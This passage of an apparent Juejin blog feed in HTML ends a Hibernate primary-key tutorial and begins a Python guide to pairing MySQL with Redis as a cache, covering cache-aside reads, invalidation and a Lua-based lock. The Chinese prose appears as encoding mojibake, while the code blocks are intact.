<span class="hljs-keyword">import</span> javax.persistence.Id;
<span class="hljs-keyword">import</span> javax.persistence.SequenceGenerator;

<span class="hljs-meta">@Entity</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.SEQUENCE, generator = "student_seq")</span>
    <span class="hljs-meta">@SequenceGenerator(name = "student_seq", sequenceName = "student_seq", allocationSize = 1)</span>
    <span class="hljs-keyword">private</span> Long id;
    
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> {}

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.name = name;
        <span class="hljs-built_in">this</span>.age = age;
    }

    <span class="hljs-comment">// getters å’Œ setters</span>
    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> age;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.age = age;
    }
}
</code></pre>
<h5 data-id="heading-8">ä½¿ç”¨ TABLE ç”Ÿæˆç­–ç•¥</h5>
<p>å¦‚æœä½¿ç”¨TABLEç­–ç•¥ï¼Œéœ€è¦åœ¨æ•°æ®åº“ä¸­åˆ›å»ºä¸€ä¸ªä¸»é”®ç”Ÿæˆè¡¨ã€‚</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> hibernate_sequences (
    sequence_name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    sequence_next_val <span class="hljs-type">BIGINT</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    <span class="hljs-keyword">PRIMARY</span> KEY (sequence_name)
);

<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> hibernate_sequences (sequence_name, sequence_next_val) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'student_seq'</span>, <span class="hljs-number">1</span>);
</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.Entity;
<span class="hljs-keyword">import</span> javax.persistence.GeneratedValue;
<span class="hljs-keyword">import</span> javax.persistence.GenerationType;
<span class="hljs-keyword">import</span> javax.persistence.Id;
<span class="hljs-keyword">import</span> javax.persistence.TableGenerator;

<span class="hljs-meta">@Entity</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.TABLE, generator = "student_gen")</span>
    <span class="hljs-meta">@TableGenerator(name = "student_gen", table = "hibernate_sequences", pkColumnName = "sequence_name",
                    valueColumnName = "sequence_next_val", pkColumnValue = "student_seq", allocationSize = 1)</span>
    <span class="hljs-keyword">private</span> Long id;
    
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> {}

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.name = name;
        <span class="hljs-built_in">this</span>.age = age;
    }

    <span class="hljs-comment">// getters å’Œ setters</span>
    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> age;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.age = age;
    }
}
</code></pre>
<h3 data-id="heading-9">äº‹åŠ¡ç®¡ç†</h3>
<p>åœ¨è¿›è¡Œæ•°æ®åº“æ“ä½œæ—¶ï¼Œéœ€è¦å¼€å¯äº‹åŠ¡ï¼Œå¹¶åœ¨æ“ä½œå®Œæˆåæäº¤äº‹åŠ¡ã€‚å¦‚æœæ“ä½œå¤±è´¥ï¼Œåˆ™å›æ»šäº‹åŠ¡ä»¥ç¡®ä¿æ•°æ®ä¸€è‡´æ€§ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// è·å–SessionFactory</span>
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sessionFactory</span> <span class="hljs-operator">=</span> HibernateUtil.getSessionFactory();
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;

        <span class="hljs-comment">// å‘æ•°æ®åº“æ·»åŠ ä¸€ä¸ªå¯¹è±¡</span>
        <span class="hljs-keyword">try</span> {
            session = sessionFactory.openSession();
            transaction = session.beginTransaction();

            <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">"John Doe"</span>, <span class="hljs-number">20</span>);
            session.save(student);

            transaction.commit();
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) {
                session.close();
            }
        }

        <span class="hljs-comment">// å…³é—­SessionFactory</span>
        sessionFactory.close();
    }
}
</code></pre>
<h3 data-id="heading-10">æ€»ç»“</h3>
<p>é€šè¿‡ä»¥ä¸Šç¤ºä¾‹ï¼Œå¯ä»¥çœ‹å‡ºHibernateæä¾›äº†å¤šç§ç­–ç•¥æ¥ç”Ÿæˆå®ä½“çš„ä¸»é”®ï¼ŒåŒ…æ‹¬<code>AUTO</code>ã€<code>IDENTITY</code>ã€<code>SEQUENCE</code>å’Œ<code>TABLE</code>ã€‚ä¸åŒçš„ç­–ç•¥é€‚ç”¨äºä¸åŒçš„æ•°æ®åº“å’Œåœºæ™¯ã€‚ç†è§£è¿™äº›ä¸»é”®ç”Ÿæˆç­–ç•¥ï¼Œå¹¶åœ¨å®é™…é¡¹ç›®ä¸­æ­£ç¡®åº”ç”¨ï¼Œå¯ä»¥æœ‰æ•ˆåœ°ç®¡ç†æ•°æ®åº“è¡¨ä¸­çš„ä¸»é”®ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MySQL å’Œ Redisæ­é…ä½¿ç”¨æŒ‡å—]]></title>    <link>https://juejin.cn/post/7589935326781751330</link>    <guid>https://juejin.cn/post/7589935326781751330</guid>    <pubDate>2026-01-01T08:13:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589935326781751330" data-draft-id="7589920318132781056" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MySQL å’Œ Redisæ­é…ä½¿ç”¨æŒ‡å—"/> <meta itemprop="keywords" content="Redis,MySQL"/> <meta itemprop="datePublished" content="2026-01-01T08:13:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å“ˆé‡Œè°¢é¡¿"/> <meta itemprop="url" content="https://juejin.cn/user/3678304397695056"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MySQL å’Œ Redisæ­é…ä½¿ç”¨æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3678304397695056/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å“ˆé‡Œè°¢é¡¿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T08:13:55.000Z" title="Thu Jan 01 2026 08:13:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>MySQL å’Œ Redis æ˜¯ç°ä»£åº”ç”¨æ¶æ„ä¸­ç»å…¸çš„ <strong>â€œæŒä¹…å­˜å‚¨ + é«˜é€Ÿç¼“å­˜â€</strong> ç»„åˆã€‚å®ƒä»¬å„è‡ªä¼˜åŠ¿äº’è¡¥ï¼š</p>
<ul>
<li><strong>MySQL</strong>ï¼šå¼ºä¸€è‡´æ€§ã€äº‹åŠ¡æ”¯æŒã€æŒä¹…åŒ–ï¼Œé€‚åˆå­˜å‚¨æ ¸å¿ƒä¸šåŠ¡æ•°æ®ï¼ˆå¦‚ç”¨æˆ·ä¿¡æ¯ã€è®¢å•ï¼‰ã€‚</li>
<li><strong>Redis</strong>ï¼šå†…å­˜æ•°æ®åº“ã€å¾®ç§’çº§å“åº”ã€ä¸°å¯Œæ•°æ®ç»“æ„ï¼Œé€‚åˆç¼“å­˜çƒ­ç‚¹æ•°æ®ã€ä¼šè¯ã€æ’è¡Œæ¦œç­‰ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-0">âœ… ä¸€ã€å…¸å‹æ­é…æ¨¡å¼</h2>





























<table><thead><tr><th>åœºæ™¯</th><th>ç­–ç•¥</th></tr></thead><tbody><tr><td><strong>è¯»å¤šå†™å°‘çš„æ•°æ®</strong>ï¼ˆå¦‚å•†å“è¯¦æƒ…ï¼‰</td><td>å…ˆæŸ¥ Redisï¼Œå‘½ä¸­åˆ™è¿”å›ï¼›æœªå‘½ä¸­æŸ¥ MySQLï¼Œå†å†™å…¥ Redis</td></tr><tr><td><strong>å†™æ“ä½œ</strong>ï¼ˆå¦‚æ›´æ–°ç”¨æˆ·èµ„æ–™ï¼‰</td><td>å…ˆæ›´æ–° MySQLï¼Œå†åˆ é™¤/æ›´æ–° Redis ä¸­çš„ç¼“å­˜ï¼ˆ<strong>Cache-Aside Pattern</strong>ï¼‰</td></tr><tr><td><strong>é˜²æ­¢ç¼“å­˜ç©¿é€</strong></td><td>å¯¹ç©ºç»“æœä¹Ÿç¼“å­˜ï¼ˆçŸ­ TTLï¼‰ï¼Œæˆ–ä½¿ç”¨å¸ƒéš†è¿‡æ»¤å™¨</td></tr><tr><td><strong>é˜²æ­¢ç¼“å­˜é›ªå´©</strong></td><td>è®¾ç½®éšæœºè¿‡æœŸæ—¶é—´</td></tr><tr><td><strong>é˜²æ­¢ç¼“å­˜å‡»ç©¿</strong></td><td>å¯¹çƒ­ç‚¹ key ä½¿ç”¨äº’æ–¥é”ï¼ˆå¦‚ Redis åˆ†å¸ƒå¼é”ï¼‰</td></tr></tbody></table>
<blockquote>
<p>ğŸ“Œ <strong>æ ¸å¿ƒåŸåˆ™</strong>ï¼š<strong>ä»¥ MySQL ä¸ºå”¯ä¸€çœŸå®æ•°æ®æºï¼ŒRedis ä»…ä¸ºç¼“å­˜</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-1">âœ… äºŒã€Python å®æˆ˜ç¤ºä¾‹ï¼ˆä½¿ç”¨ <code>pymysql</code> + <code>redis-py</code>ï¼‰</h2>
<h3 data-id="heading-2">1. å®‰è£…ä¾èµ–</h3>
<pre><code class="hljs">pip install pymysql redis
</code></pre>
<h3 data-id="heading-3">2. åˆå§‹åŒ–è¿æ¥</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> redis
<span class="hljs-keyword">import</span> pymysql
<span class="hljs-keyword">import</span> json
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> contextmanager

<span class="hljs-comment"># Redis è¿æ¥ï¼ˆå¸¦è¿æ¥æ± ï¼‰</span>
redis_client = redis.Redis(
    host=<span class="hljs-string">'localhost'</span>,
    port=<span class="hljs-number">6379</span>,
    decode_responses=<span class="hljs-literal">True</span>,  <span class="hljs-comment"># è‡ªåŠ¨è§£ç  bytes ä¸º str</span>
    socket_connect_timeout=<span class="hljs-number">2</span>,
    socket_timeout=<span class="hljs-number">2</span>
)

<span class="hljs-comment"># MySQL è¿æ¥é…ç½®</span>
DB_CONFIG = {
    <span class="hljs-string">'host'</span>: <span class="hljs-string">'localhost'</span>,
    <span class="hljs-string">'user'</span>: <span class="hljs-string">'root'</span>,
    <span class="hljs-string">'password'</span>: <span class="hljs-string">'your_password'</span>,
    <span class="hljs-string">'database'</span>: <span class="hljs-string">'blog_db'</span>,
    <span class="hljs-string">'charset'</span>: <span class="hljs-string">'utf8mb4'</span>,
    <span class="hljs-string">'cursorclass'</span>: pymysql.cursors.DictCursor
}

<span class="hljs-meta">@contextmanager</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_db_connection</span>():
    conn = pymysql.connect(**DB_CONFIG)
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">yield</span> conn
    <span class="hljs-keyword">finally</span>:
        conn.close()
</code></pre>
<hr/>
<h3 data-id="heading-4">3. ç¼“å­˜ç­–ç•¥å®ç°ï¼š<strong>Cache-Asideï¼ˆæ—è·¯ç¼“å­˜ï¼‰</strong></h3>
<h4 data-id="heading-5">ğŸ“Œ åœºæ™¯ï¼šæ ¹æ®ç”¨æˆ· ID è·å–ç”¨æˆ·ä¿¡æ¯</h4>
<pre><code class="hljs language-python" lang="python">CACHE_PREFIX = <span class="hljs-string">"user:"</span>
CACHE_TTL = <span class="hljs-number">300</span>  <span class="hljs-comment"># 5åˆ†é’Ÿ</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user_by_id</span>(<span class="hljs-params">user_id: <span class="hljs-built_in">int</span></span>):
    <span class="hljs-string">"""ä»ç¼“å­˜æˆ–æ•°æ®åº“è·å–ç”¨æˆ·"""</span>
    cache_key = <span class="hljs-string">f"<span class="hljs-subst">{CACHE_PREFIX}</span><span class="hljs-subst">{user_id}</span>"</span>
    
    <span class="hljs-comment"># 1. å…ˆæŸ¥ Redis</span>
    cached = redis_client.get(cache_key)
    <span class="hljs-keyword">if</span> cached <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"âœ… Hit cache"</span>)
        <span class="hljs-keyword">return</span> json.loads(cached)
    
    <span class="hljs-comment"># 2. ç¼“å­˜æœªå‘½ä¸­ï¼ŒæŸ¥ MySQL</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"âŒ Cache miss, querying MySQL..."</span>)
    <span class="hljs-keyword">with</span> get_db_connection() <span class="hljs-keyword">as</span> conn:
        <span class="hljs-keyword">with</span> conn.cursor() <span class="hljs-keyword">as</span> cursor:
            cursor.execute(<span class="hljs-string">"SELECT id, name, email FROM users WHERE id = %s"</span>, (user_id,))
            user = cursor.fetchone()
    
    <span class="hljs-keyword">if</span> user:
        <span class="hljs-comment"># 3. å†™å…¥ç¼“å­˜ï¼ˆæ³¨æ„ï¼šåºåˆ—åŒ–ä¸º JSONï¼‰</span>
        redis_client.setex(cache_key, CACHE_TTL, json.dumps(user))
        <span class="hljs-keyword">return</span> user
    <span class="hljs-keyword">else</span>:
        <span class="hljs-comment"># 4. é˜²æ­¢ç¼“å­˜ç©¿é€ï¼šå¯¹ç©ºç»“æœä¹Ÿç¼“å­˜ï¼ˆçŸ­æ—¶é—´ï¼‰</span>
        redis_client.setex(cache_key, <span class="hljs-number">60</span>, <span class="hljs-string">""</span>)  <span class="hljs-comment"># ç©ºå€¼ç¼“å­˜ 60 ç§’</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
</code></pre>
<hr/>
<h3 data-id="heading-6">4. æ›´æ–°æ•°æ®æ—¶åŒæ­¥ç¼“å­˜</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_user</span>(<span class="hljs-params">user_id: <span class="hljs-built_in">int</span>, name: <span class="hljs-built_in">str</span>, email: <span class="hljs-built_in">str</span></span>):
    <span class="hljs-string">"""æ›´æ–°ç”¨æˆ·ä¿¡æ¯ï¼Œå¹¶å¤±æ•ˆç¼“å­˜"""</span>
    <span class="hljs-comment"># 1. å…ˆæ›´æ–° MySQL</span>
    <span class="hljs-keyword">with</span> get_db_connection() <span class="hljs-keyword">as</span> conn:
        <span class="hljs-keyword">with</span> conn.cursor() <span class="hljs-keyword">as</span> cursor:
            cursor.execute(
                <span class="hljs-string">"UPDATE users SET name=%s, email=%s WHERE id=%s"</span>,
                (name, email, user_id)
            )
            conn.commit()
    
    <span class="hljs-comment"># 2. åˆ é™¤ Redis ç¼“å­˜ï¼ˆæ¨èâ€œåˆ é™¤â€è€Œéâ€œæ›´æ–°â€ï¼Œé¿å…å¹¶å‘ä¸ä¸€è‡´ï¼‰</span>
    cache_key = <span class="hljs-string">f"<span class="hljs-subst">{CACHE_PREFIX}</span><span class="hljs-subst">{user_id}</span>"</span>
    redis_client.delete(cache_key)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ğŸ§¹ Cache invalidated for user <span class="hljs-subst">{user_id}</span>"</span>)
</code></pre>
<blockquote>
<p>ğŸ’¡ <strong>ä¸ºä»€ä¹ˆåˆ é™¤è€Œä¸æ˜¯æ›´æ–°ï¼Ÿ</strong></p>
<ul>
<li>æ›´æ–°éœ€æŸ¥ DB å†å†™ç¼“å­˜ï¼Œå¤šä¸€æ¬¡æŸ¥è¯¢</li>
<li>å¹¶å‘åœºæ™¯ä¸‹å¯èƒ½å†™å…¥æ—§æ•°æ®ï¼ˆå…ˆæ›´æ–° DB çš„è¯·æ±‚åå†™ç¼“å­˜ï¼‰</li>
<li><strong>åˆ é™¤æ›´ç®€å•å®‰å…¨</strong>ï¼šä¸‹æ¬¡è¯»è‡ªåŠ¨åŠ è½½æœ€æ–°æ•°æ®</li>
</ul>
</blockquote>
<hr/>
<h3 data-id="heading-7">5. é˜²æ­¢ç¼“å­˜å‡»ç©¿ï¼šçƒ­ç‚¹ Key åŠ é”</h3>
<blockquote>
<p>å½“æŸä¸ª key è¿‡æœŸç¬é—´ï¼Œå¤§é‡è¯·æ±‚åŒæ—¶å‡»ç©¿åˆ° DBã€‚</p>
</blockquote>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> uuid

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user_safe</span>(<span class="hljs-params">user_id: <span class="hljs-built_in">int</span></span>):
    <span class="hljs-string">"""å¸¦åˆ†å¸ƒå¼é”é˜²æ­¢ç¼“å­˜å‡»ç©¿"""</span>
    cache_key = <span class="hljs-string">f"<span class="hljs-subst">{CACHE_PREFIX}</span><span class="hljs-subst">{user_id}</span>"</span>
    
    <span class="hljs-comment"># 1. æŸ¥ç¼“å­˜</span>
    cached = redis_client.get(cache_key)
    <span class="hljs-keyword">if</span> cached <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
        <span class="hljs-keyword">return</span> json.loads(cached)
    
    <span class="hljs-comment"># 2. å°è¯•è·å–åˆ†å¸ƒå¼é”ï¼ˆé”å = cache_key + ":lock"ï¼‰</span>
    lock_key = cache_key + <span class="hljs-string">":lock"</span>
    lock_value = <span class="hljs-built_in">str</span>(uuid.uuid4())
    lock_ttl = <span class="hljs-number">5000</span>  <span class="hljs-comment"># 5ç§’</span>
    
    <span class="hljs-comment"># ä½¿ç”¨ Lua è„šæœ¬åŸå­åŠ é”ï¼ˆè§å‰æ–‡ï¼‰</span>
    lock_script = redis_client.register_script(<span class="hljs-string">"""
    if redis.call("SET", KEYS[1], ARGV[1], "NX", "PX", ARGV[2]) then
        return 1
    else
        return 0
    end
    """</span>)
    
    <span class="hljs-keyword">if</span> lock_script(keys=[lock_key], args=[lock_value, lock_ttl]):
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># åŒé‡æ£€æŸ¥ï¼šå¯èƒ½å…¶ä»–çº¿ç¨‹å·²åŠ è½½</span>
            cached = redis_client.get(cache_key)
            <span class="hljs-keyword">if</span> cached <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
                <span class="hljs-keyword">return</span> json.loads(cached)
            
            <span class="hljs-comment"># æŸ¥è¯¢ DB å¹¶å†™ç¼“å­˜</span>
            <span class="hljs-keyword">with</span> get_db_connection() <span class="hljs-keyword">as</span> conn:
                <span class="hljs-keyword">with</span> conn.cursor() <span class="hljs-keyword">as</span> cursor:
                    cursor.execute(<span class="hljs-string">"SELECT id, name, email FROM users WHERE id = %s"</span>, (user_id,))
                    user = cursor.fetchone()
            
            <span class="hljs-keyword">if</span> user:
                redis_client.setex(cache_key, CACHE_TTL, json.dumps(user))
                <span class="hljs-keyword">return</span> user
            <span class="hljs-keyword">else</span>:
                redis_client.setex(cache_key, <span class="hljs-number">60</span>, <span class="hljs-string">""</span>)
                <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
        <span class="hljs-keyword">finally</span>:
            <span class="hljs-comment"># é‡Šæ”¾é”ï¼ˆLua è„šæœ¬ç¡®ä¿å®‰å…¨ï¼‰</span>
            unlock_script = redis_client.register_script(<span class="hljs-string">"""
            if redis.call("GET", KEYS[1]) == ARGV[1] then
                return redis.call("DEL", KEYS[1])
            else
                return 0
            end
            """</span>)
            unlock_script(keys=[lock_key], args=[lock_value])
    <span class="hljs-keyword">else</span>:
